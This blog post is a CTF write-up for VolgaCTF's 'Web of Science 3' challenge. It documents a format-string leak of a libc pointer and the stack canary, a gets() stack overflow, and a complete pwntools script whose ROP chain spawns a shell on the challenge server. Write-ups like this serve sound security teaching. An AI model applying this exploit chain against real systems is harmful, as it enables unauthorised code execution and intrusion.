---
layout: post
title: "VolgaCTF - Web of Science 3"
date: 2016-03-29 00:00
categories: ctf exploit
---
This is the third and final pwn of VolgaCTF. ASLR is now activated, which would
not have changed the outcome of the two previous challenges, therefore there
must be something else...

# Basic information

From the organizers:
{% highlight text %}
Web of Science 3

This is an improved version of the improved version of the well-known
scientific search engine. Curiously it's still working.

nc webofscience3.2016.volgactf.ru 45680
{% endhighlight %}

The binary has the same attributes as the previous one.

{% highlight shell-session %}
$ file web_of_science3
web_of_science3: ELF 64-bit LSB executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux
2.6.24, BuildID[sha1]=2639d46c681ad56f583b9e706bfbef981f88d9eb, stripped

$ checksec --file web_of_science
RELRO
Partial RELRO

STACK CANARY
Canary found

NX
NX enabled

PIE
No PIE

RPATH
No RPATH

RUNPATH
No RUNPATH
{% endhighlight %}

# Operation

The operation has changed and the fragment of new code that was seen in the
previous binary is now used:
{% highlight shell-session %}
$ nc webofscience3.2016.volgactf.ru 45680
Solve a puzzle: find an x such that SHA1(x)[-3:]=='\xff\xff\xff' and len(x)==29
and x[:24]==151e10161d1f1d1318131715
{% endhighlight %}

Now we have to solve a real challenge before being able to reach the rest of the program:

## Solving the SHA1 challenge

I went for a bruteforce over the five bytes using the [`permutations`][perm] function
of the library `itertools`:
{% highlight python %}
def bruteforce(req):
    p = log.progress('Bruteforcing the SHA1')
    for i in permutations(range(0, 256), 5):
        test = req + ''.join(chr(c) for c in i)
        s = sha1(test)
        if s.digest()[-3:] == '\xff\xff\xff':
            p.success('found: ' + test)
            return test

data = r.recv()

req = data.split('=')[6].strip('\n')
found_sha = bruteforce(req)
r.sendline(found_sha)
{% endhighlight %}

Usually the bruteforce should not take more than 10 seconds, when it did, I
just killed it and relaunched it to get a new challenge.

## Rest of the program

When the SHA1 challenge is succeeded, we have access to the rest of the program
which seems to be a papers manager:
{% highlight shell-session %}
Solve a puzzle: find an x such that SHA1(x)[-3:]=='\\xff\\xff\\xff' and
len(x)==29 and x[:24]==121d1c151c1f1d101a111a11
121d1c151c1f1d101a111a11..^.\v
[1]. Add paper
[2]. Delete paper
[3]. List papers
[4]. View paper info
[5]. Exit

> 1

Add paper menu
[1]. Add name
[2]. Add authors
[3]. Add abstract
[4]. Add tags
[5]. Add url
[6]. Add index
[7]. Add reviews
[8]. View paper info
[9]. Quit
[10]. Quit without saving

> 
{% endhighlight %}

The first and main menu is handled by that function:
{% highlight ca85 %}
$ r2 -A web_of_science3
 -- This software comes with no brain included. Please use your own.
[0x00400a10]> pdf @0x401810
/ (fcn) fcn.00401779 400
|           ; arg int arg_5h       @ rbp+0x5
|           ; var int local_8h     @ rbp-0x8
|           ; var int local_18h    @ rbp-0x18
|           ; var int local_20h    @ rbp-0x20
|           ; var int local_28h    @ rbp-0x28
|           ; var int local_30h    @ rbp-0x30
|           ; var int local_34h    @ rbp-0x34
|           ; var int local_38h    @ rbp-0x38
|           ; CALL XREF from 0x00401982 (fcn.00401779)
|           0x00401779      55             push rbp
|           0x0040177a      4889e5         mov rbp, rsp
|           0x0040177d      4883ec40       sub rsp, 0x40
|           0x00401781      64488b042528.  mov rax, qword fs:[0x28]    ; [0x28:8]=0x3218  ; '('
|           0x0040178a      488945f8       mov qword [rbp - local_8h], rax
|           0x0040178e      31c0           xor eax, eax
|           0x00401790      48c745d00000.  mov qword [rbp - local_30h], 0
|           0x00401798      48c745d80000.  mov qword [rbp - local_28h], 0
|           0x004017a0      48c745e00000.  mov qword [rbp - local_20h], 0
|           0x004017a8      48c745e80000.  mov qword [rbp - local_18h], 0
|           0x004017b0      c745c8000000.  mov dword [rbp - local_38h], 0
|           0x004017b7      c745cc000000.  mov dword [rbp - local_34h], 0
|           ; JMP XREF from 0x00401904 (fcn.00401779)
|       .-> 0x004017be      bf881d4000     mov edi, str.Choose_command_to_perform ; "Choose command to perform" @ 0x401d88
|       |   0x004017c3      e838f1ffff     call sym.imp.puts
|       |   0x004017c8      bfa21d4000     mov edi, str._1_._Add_paper ; "[1]. Add paper" @ 0x401da2
|       |   0x004017cd      e82ef1ffff     call sym.imp.puts
|       |   0x004017d2      bfb11d4000     mov edi, str._2_._Delete_paper ; "[2]. Delete paper" @ 0x401db1
|       |   0x004017d7      e824f1ffff     call sym.imp.puts
|       |   0x004017dc      bfc31d4000     mov edi, str._3_._List_papers ; "[3]. List papers" @ 0x401dc3
|       |   0x004017e1      e81af1ffff     call sym.imp.puts
|       |   0x004017e6      bfd41d4000     mov edi, str._4_._View_paper_info ; "[4]. View paper info" @ 0x401dd4
|       |   0x004017eb      e810f1ffff     call sym.imp.puts
|       |   0x004017f0      bfe91d4000     mov edi, str._5_._Exit_n    ; "[5]. Exit." @ 0x401de9
|       |   0x004017f5      e806f1ffff     call sym.imp.puts
|       |   0x004017fa      bff11b4000     mov edi, 0x401bf1           ; "> " @ 0x401bf1
|       |   0x004017ff      b800000000     mov eax, 0
|       |   0x00401804      e8d7f0ffff     call sym.imp.printf
|       |   0x00401809      488d45d0       lea rax, qword [rbp - local_30h]
|       |   0x0040180d      4889c7         mov rdi, rax
|       |   0x00401810      e87bf1ffff     call sym.imp.gets
|       |   0x00401815      488d45d0       lea rax, qword [rbp - local_30h]
|       |   0x00401819      4889c7         mov rdi, rax
|       |   0x0040181c      e84ff1ffff     call sym.imp.atoi
|       |   0x00401821      8945c8         mov dword [rbp - local_38h], eax
|       |   0x00401824      bff41b4000     mov edi, 0x401bf4
|       |   0x00401829      e8d2f0ffff     call sym.imp.puts
|       |   0x0040182e      837dc805       cmp dword [rbp - local_38h], 5 ; [0x5:4]=257
|      ,==< 0x00401832      0f87cb000000   ja 0x401903                
|      ||   0x00401838      8b45c8         mov eax, dword [rbp - local_38h]
|      ||   0x0040183b      488b04c5401e.  mov rax, qword [rax*8 + 0x401e40] ; [0x401e40:8]=0x401903 
|      ||   0x00401843      ffe0           jmp rax
[snip]
{% endhighlight %}

At `0x00401810` the choice is read through the `gets` function. At `0x0040183b`
and `0x00401843` the choice used to select a function in a table array located
at `0x401e40`:
{% highlight shell-session %}
gef➤   x/6gx 0x401e40
0x401e40:	0x0000000000401903	0x0000000000401845
0x401e50:	0x0000000000401854	0x000000000040188a
0x401e60:	0x0000000000401896	0x0000000000401909
{% endhighlight %}

# Vulnerabilities

## String format

The parts that we were exploiting in the two previous challenges have been
replaced with that SHA1 challenge that doesn't seem to be vulnerable.
Vulnerabilities must now be found in the papers menus. As in the previous ones,
canaries are enabled, therefore we should find a way to leak one. If we want to
reuse the previous ROP chain, we'll also need a pointer to the libc. Let's hunt
for a string format in each of the seven following attributes of a paper:
{% highlight shell-session %}
Add paper menu
[1]. Add name
[2]. Add authors
[3]. Add abstract
[4]. Add tags
[5]. Add url
[6]. Add index
[7]. Add reviews
[8]. View paper info
[9]. Quit
[10]. Quit without saving

> 
{% endhighlight %}

Once done, the option number 9 `Quit` must be chosen and then on the main menu, the option number 4 `View paper info`: {% highlight shell-session %}
Enter index of paper to view: 0
Paper name:
  "%p %p %p %p"
Authors:
  %p %p %p %p
Abstract:
  0x7fff6eaae280 0x7f9e129309e0 0xffffffffffffffff 0x7f9e12f26740
Tags:
  0x7fff6eaae280 0x7f9e129309e0 0xffffffffffffffff 0x7f9e12f26740
URL:
  0x7fff6eaae280 0x7f9e129309e0 0xffffffffffffffff 0x7f9e12f26740
Reviews:
  Reviewer id:
    0
  The review:
    %p %p %p %p

  Reviewer id:
    1
  The review:
    %p %p %p %p

{% endhighlight %}

The fields abstract, tags and URL are vulnerable to string format. Only one of
them is needed. Let's inject some more `%p`s into the abstract field:
{% highlight shell-session %}
Abstract:
	0x7fff6fe31700 0x7f3d1c0df9e0 0xffffffffffffffff 0x7f3d1c6d5740
0x7fff6fe33e41 0x7fff6fe33f70 0x603100 (nil) 0x1bd58f60 0x7fff6fe33e70 0x401901
0x3631383162316331 0x4 0x30 (nil) (nil) (nil) 0x400a10 0x9d8b247c324e4400
0x7fff6fe33e90 0x401987 0x7fff6fe33f78 0x100000000 (nil) 0x7f3d1bd40ec5 (nil)
0x7fff6fe33f78 0x100000000 0x401920 (nil) 0x49dc5c9c182d0ebe 0x400a10
0x7fff6fe33f70 (nil) (nil) 0xb622835a656d0ebe 0xb7a66b3404d70ebe (nil) (nil)
(nil) 0x401990 0x7fff6fe33f78 0x1 (nil) (nil) 0x400a10 0x7fff6fe33f70 (nil)
0x400a39 0x7fff6fe33f68
{% endhighlight %}

We have all what we need:

* libc pointer: `0x7f3d1c0df9e0` is the 2nd leaked value
* canary: `0x9d8b247c324e4400` is the 19th leaked value

These are values stored in the stack frame of the function handling the main
menu, therefore an overflow should be found on the menu.

Let's find the base address of the libc during that run:
{% highlight shell-session %}
gef➤  vmmap
             Start                End             Offset Perm Path
[snip]
0x00007f3d1bd1f000 0x00007f3d1beda000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.19.so
0x00007f3d1beda000 0x00007f3d1c0d9000 0x00000000001bb000 --- /lib/x86_64-linux-gnu/libc-2.19.so
0x00007f3d1c0d9000 0x00007f3d1c0dd000 0x00000000001ba000 r-- /lib/x86_64-linux-gnu/libc-2.19.so
0x00007f3d1c0dd000 0x00007f3d1c0df000 0x00000000001be000 rw- /lib/x86_64-linux-gnu/libc-2.19.so
[snip]
{% endhighlight %}

The offset of the leaked libc pointer is:
{% highlight shell-session %}
offset = libc_pointer - base_libc
       = 0x7f3d1c0df9e0 - 0x7f3d1bd1f000
       = 3934688
{% endhighlight %}

## Stack buffer overflow

The main menu is vulnerable to buffer overflow. It is possible to insert
arbitrary values in the choice selection to write passed the buffer. Let's
break right before the call to `gets`:
{% highlight shell-session %}
gef➤ b *0x401810
[snip]
gef➤ i r
[snip]
rdi     0x00007fffeb9b79a0
[snip]
gef➤  i frame
Stack level 0, frame at 0x7fffeb9b79e0:
 rip = 0x401810; saved rip = 0x401987
 called by frame at 0x7fffeb9b7a00
 Arglist at 0x7fffeb9b7988, args: 
 Locals at 0x7fffeb9b7988, Previous frame's sp is 0x7fffeb9b79e0
 Saved registers:
  rbp at 0x7fffeb9b79d0, rip at 0x7fffeb9b79d8
gef➤  x/12xg $rsp
0x7fffeb9b7990: 0x3331623138313231  0x0000000000000000
0x7fffeb9b79a0: 0x0000000000000000  0x0000000000000000
0x7fffeb9b79b0: 0x0000000000000000  0x0000000000000000
0x7fffeb9b79c0: 0x0000000000400a10  0xfe7b70ecef673a00
0x7fffeb9b79d0: 0x00007fff4359fd30  0x0000000000401987
{% endhighlight %}

Saved `rip` is located at `0x7fffeb9b79d8`, the canary at `0x7fffeb9b79c8` and
the start of our buffer at `0x7fffeb9b79a0`. This gives us the following
payload:

* 40 bytes of padding, zeros are good candidates
* canary
* 8 bytes of padding
* ROP chain (the same as the one used in the previous challenge)

When that payload is passed as a choice to the main menu, the program will
reprint the menu and ask again for a choice. At that moment the option 5 `Exit`
is chosen to exit the function and return on the ROP chain. As shown in the
jumping table show above, here is the instrcution that are executed when the
`Exit` option is chosen: 
{% highlight ca65 %}
[0x00400a10]> pd @0x401909
            0x00401909      90             nop
            0x0040190a      488b45f8       mov rax, qword [rbp - 8]
            0x0040190e      644833042528.  xor rax, qword fs:[0x28]
        ,=< 0x00401917      7405           je 0x40191e
        |   0x00401919      e892f0ffff     call sym.imp.__stack_chk_fail
    ; JMP XREF from 0x00401917 (unk)
        `-> 0x0040191e      c9             leave
            0x0040191f      c3             ret
{% endhighlight %}

We see the check of the canary and then the return.

# Creation of the overall payload

To recap what we have to do:

* resolve the SHA1 challenge
* create a paper with just an abstract containing string formats
* leak a libc pointer and the stack canary
* inject the payload
* choose the option 5 to exit

This gives us the following script:
{% highlight python %}
#!/usr/bin/env python2

from itertools import permutations
from time import sleep
from hashlib import sha1
from pwn import *

HOST = 'webofscience3.2016.volgactf.ru'
PORT = 45680
libc_offset = 3934688

context.arch='amd64'

def bruteforce(req):
    p = log.progress('Bruteforcing the SHA1')
    for i in permutations(range(0, 256), 5):
        test = req + ''.join(chr(c) for c in i)
        s = sha1(test)
        if s.digest()[-3:] == '\xff\xff\xff':
            p.success('found: ' + test)
            return test

r = remote(HOST, PORT)

data = r.recv()

req = data.split('=')[6].strip('\n')
found_sha = bruteforce(req)
r.sendline(found_sha)
# add a paper
r.sendline('1')
# add an abstract
r.sendline('3')
r.sendline('|%2$p|%19$p|')
# save & quit
r.sendline('9')
# view paper
r.sendline('4')
r.sendline('0')
data = r.recvuntil('Tags:')
data = data.split('|')
libc_ptr = int(data[1], 16)
canary = int(data[2], 16)
log.info('leaked libc ptr:  0x{:x}'.format(libc_ptr))
log.info('leaked canary:    0x{:x}'.format(canary))
libc_base = libc_ptr - libc_offset

# Padding
payload  = 'A' * 40
payload += pack(canary)
payload += 'B' * 8
# 0x000000000001b218 : pop rax ; ret
payload += pack(libc_base + 0x1b218)
payload += pack(59)
# 0x0000000000022b1a : pop rdi ; ret
payload += pack(libc_base + 0x22b1a)
payload += pack(libc_base + 1559771)
# 0x0000000000024805 : pop rsi ; ret
payload += pack(libc_base + 0x24805)
payload += pack(0)
# 0x0000000000001b8e : pop rdx ; ret
payload += pack(libc_base + 0x1b8e)
payload += pack(0)
# 0x00000000000c1e55 : syscall ; ret
payload += pack(libc_base + 0xc1e55)
r.sendline(payload)
# Exit
r.sendline('5')
r.clean()
r.interactive()
{% endhighlight %}

And *voilà*
{% highlight shell-session %}
$ ./payload.py 
[+] Opening connection to webofscience3.2016.volgactf.ru on port 45680: Done
[+] Bruteforcing the SHA1: Found: 1a111e121218191113191617\x00\x00\xbcGÒ
                                                                        [*] leaked stack ptr: 0x7ffc174c16e0
[*] leaked libc ptr:  0x7ff35b6f69e0
[*] leaked canary:    0x911a16c1ab890b00
[*] Switching to interactive mode


Choose command to perform
[1]. Add paper
[2]. Delete paper
[3]. List papers
[4]. View paper info
[5]. Exit

> 

$ ls
flag_wos3.txt
install
killer_wos3
libc.so.6
server
start_wos3
web_of_science3
$ cat flag_wos3.txt
VolgaCTF{DEP_and_@SLR_may_be_usel3ss}
{% endhighlight %}

See you for the next CTF!

[perm]: https://docs.python.org/2/library/itertools.html#itertools.permutations
